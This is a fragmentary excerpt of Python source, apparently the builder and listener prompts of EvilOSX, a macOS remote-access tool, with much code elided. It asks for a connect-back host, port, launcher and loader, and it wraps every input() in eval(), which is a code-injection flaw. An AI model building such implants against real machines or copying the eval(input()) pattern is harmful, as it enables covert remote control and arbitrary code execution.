...
def builder():
    server_host = eval(input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): "))
    server_port = int(eval(input(MESSAGE_INPUT + "Server port: ")))
    program_directory = eval(input(MESSAGE_INPUT + "Where should EvilOSX live? "
    ...
    while True:
        try:
            selected_launcher = eval(input(MESSAGE_INPUT + "Launcher to use (Leave empty for 1): "))
    ...
    while True:
        try:
            selected_loader = eval(input(MESSAGE_INPUT + "Loader to use (Leave empty for 0): "))
    ...
    for option_message in loaders.get_option_messages(selected_loader):
        set_options.append(eval(input(MESSAGE_INPUT + option_message)))
...
def main():
    ...
    if arguments.port:
        ...
        while True:
            try:
                server_port = int(eval(input(MESSAGE_INPUT + "Server port to listen on: ")))
                break
            except ValueError:
